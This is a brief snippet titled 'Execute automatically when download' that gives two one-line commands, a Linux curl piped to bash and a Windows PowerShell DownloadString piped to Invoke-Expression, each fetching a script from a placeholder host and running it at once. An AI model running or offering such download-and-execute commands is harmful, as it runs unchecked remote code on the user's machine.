
# Execute automatically when download

Linux:-

`curl -s http://example.com/myscript.sh | bash`


Windows:-

`(New-Object System.Net.WebClient).DownloadString('http://example.com/myscript.ps1') | Invoke-Expression`
